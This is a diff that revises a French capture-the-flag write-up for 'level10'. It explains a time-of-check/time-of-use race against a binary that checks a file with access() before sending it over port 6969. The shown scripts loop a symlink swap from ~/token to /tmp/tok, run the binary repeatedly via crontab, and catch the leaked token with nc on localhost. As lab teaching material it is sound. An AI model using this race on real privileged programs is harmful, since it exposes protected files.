@@ -6,12 +6,13 @@
 *       -> resultat
 */
 
-En executant le script level10 on remarque qu il attend un fichier et un host. Ca ressemble au niveau 8 donc utilise la methode strings et gdb pour en
+En éxecutant le script level10 on remarque qu il attend un fichier et un host. Ca ressemble au niveau 8 donc utilise la methode strings et gdb pour en
 apprendre plus sur le binaire:
-    - on remarque au on utilise la fonction access donc il verifie les droits du fichiers avant de pouvoir l ouvrir
-    - aussi il utilise une connexion socket (function socket et connect) sur le port 6969
-Il va donc falloir de maniere similaire au level08 lui faire croire qu on a les droits sur le fichier token pour qu il envoie le fichier sur le socket par le port 6969.
-Ainsi on va ecrire 2 scripts:
+    - on remarque l'utilisation de la fonction access donc il verifie les droits du fichiers avant de pouvoir l ouvrir
+    - aussi il utilise une connexion socket (fonction socket et connect) sur le port 6969
+Il va donc falloir de maniere similaire au level08 lui faire croire qu'on a les droits sur le fichier token pour qu il envoie le fichier sur le socket par le port 6969. 
+
+Ainsi on va écrire 2 scripts:
     - /tmp/hack:
 /*********************/
     #!/bin/sh
@@ -20,7 +21,7 @@ Ainsi on va ecrire 2 scripts:
     ln -s ~/token /tmp/tok
     done
 /**********************/
-Ce script créé en boucle le lien symbolique de token vers /tmp/tok. cela va permettre d exploiter le temps entre l open et l access.
+Ce script créé en boucle le lien symbolique de token vers /tmp/tok. cela va permettre d'exploiter le temps entre l'appel de la fonction access et la fonction open.
 
     - /tmp/method:
 /**********************/
@@ -29,15 +30,14 @@ Ce script créé en boucle le lien symbolique de token vers /tmp/tok. cela va pe
     ~/level10 /tmp/tok 127.0.0.1
     done
 /**********************/
-Ce script execute le binaire level10 avec le fichier tok créé au dessus et utilise le localhost.
+Ce script éxecute le binaire level10 avec le fichier tok créé au dessus et utilise l'adresse localhost.
 
-On ajoute ces 2 scripts pour etre executer en permanence (toutes les 2 minutes) avec la commande crontab -e:
-crontab -e:
+On ajoute ces 2 scripts dans crontab pour être éxecuter en permanence (toutes les 2 minutes) avec la commande crontab -e:
 */2 * * * * sh /tmp/hack
 */2 * * * * sh /tmp/method
 
-En faisant un ps -aux, on peut voir les 2 scripts sont executes. Il nous suffit donc d'ecouter le port 6969 avec la commande nc et attendre que le flag sorte:
-nc -lk 6969 (option l et k force la commande a reste ecoute). Après quelques minutes, on a :
+En faisant un ps -aux, on peut voir les 2 scripts sont éxecutes. Il nous suffit donc d'écouter le port 6969 avec la commande nc et attendre que le flag s'affiche:
+nc -lk 6969 (option l et k force la commande a resté à l'écoute). Après quelques minutes, on a :
 .*( )*.
 .*( )*.
 .*( )*.
